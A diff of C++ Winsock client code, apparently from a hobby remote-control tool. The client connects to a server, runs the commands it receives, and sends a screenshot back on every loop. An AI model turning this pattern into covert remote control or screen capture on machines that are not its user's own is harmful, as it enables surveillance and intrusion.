@@ -1,77 +1,5 @@
 #include "networking.h"
 const int DEFAULT_PORT = 3002;
-const int BUFFER_SIZE = 4096;
-/*
-void network::client(char ip[])
-{
-	std::cout << "Attempting connection to " << ip << "\n";
-
-	WSADATA wsaData;
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-	{
-		std::cerr << "Failed to init winsock.\n";
-		return;
-	}
-
-	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
-	if (clientSocket == INVALID_SOCKET)
-	{
-		std::cerr << "Failed to create client socket.\n";
-		WSACleanup();
-		return;
-	}
-
-	sockaddr_in serverAddress;
-	serverAddress.sin_family = AF_INET;
-	serverAddress.sin_addr.s_addr = inet_addr(ip);
-	serverAddress.sin_port = htons(DEFAULT_PORT);
-
-	if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR)
-	{
-		std::cerr << "Failed to connect to the server.\n";
-		closesocket(clientSocket);
-		WSACleanup();
-		return;
-	}
-
-	std::cout << "Connected to server.\n";
-
-	while (true)
-	{
-		std::string recv = receiveData(clientSocket);
-		if (recv.empty())
-		{
-			std::cout << "Server disconnected.\n";
-			break;
-		}
-		
-		if (recv == "Screenshot")
-		{
-			std::cout << "Sending screenshot.\n";
-			std::vector<char> imageData = commands::Screenshot_C();
-			std::cout << "DATA: " << imageData.size() << " bytes.\n";
-			int bytes_sent = send(clientSocket, imageData.data(), imageData.size(), 0);
-			send(clientSocket, "EOF", 3, 0);
-			std::cout << "Screenshot Sent.\n";
-		}
-		else
-		{
-			std::vector<std::string> cleaning = CommandHandler::cleanFunctions(recv);
-			CommandHandler::callFunction(cleaning);
-
-			sendData(clientSocket, "command received.\n");
-
-			std::cout << "Server: " << recv << "\n";
-
-			cleaning.clear();
-			recv.clear();
-		}
-	}
-
-	closesocket(clientSocket);
-	WSACleanup();
-}
-*/
 
 int network::reworkedClient(char ip[])
 {
@@ -113,51 +41,52 @@ int network::reworkedClient(char ip[])
 
 	//std::cout << "FASTMODE = " << connectionInfo["fastMode"];
 
+	CommandHandler commandHandler;
+
 	while(true)
 	{
-		//Receive data from the server
+		auto data = networking::recvData(clientSocket);
 
-		auto dd = networking::recvData(clientSocket);
+		std::cout << data << "\n";
 
-		std::cout << dd << "\n";
-
-		if(dd == NULL)
+		if(data == NULL)
 		{
 			return -1;
 		}
 
 
-		networking::ServerPacket sp;
-		sp.parse(dd);
+		networking::ServerPacket serverPacket;
+		serverPacket.parse(data);
 
-		if(sp.information == "Shutdown")
+		if(serverPacket.information == "Shutdown")
 		{
 			closesocket(clientSocket);
 			WSACleanup();
 			exit(0);
 		}
 
-		printf("AA\n");
-		printf("Command: %s\n", sp.command.c_str());
+		printf("Command: %s\n", serverPacket.command.c_str());
 
-		std::vector<std::string> cleaning = CommandHandler::cleanFunctions(sp.command);
-		std::cout << "Cleaning: " << cleaning[0] << "\n";
+		commandHandler.setInput(serverPacket.command);
 
-		dd.clear();
-		sp.clear();
+		data.clear();
+		serverPacket.clear();
 
 		networking::ClientPacket clientPacket;
 		clientPacket.resp = "handled";
 		clientPacket.screenData = commands::Screenshot_C();
 		nlohmann::json clientData = clientPacket.create();
+		std::cout << "ClientData: " << clientData["response"].get<std::string>() << "\n";
 
-		std::cout << clientData.dump(4) << "\n";
+		commandHandler.callFunction();
 
-		CommandHandler::callFunction(cleaning);
-		//commands::randomPixel(100, 100, 50);
-
+		std::cout << "[+] Sending data\n";
 		networking::sendData(clientSocket, clientData);
+		std::cout << "[+] Data sent!\n";
 	}
+
+	closesocket(clientSocket);
+	WSACleanup();
 
 	return 0;
 }
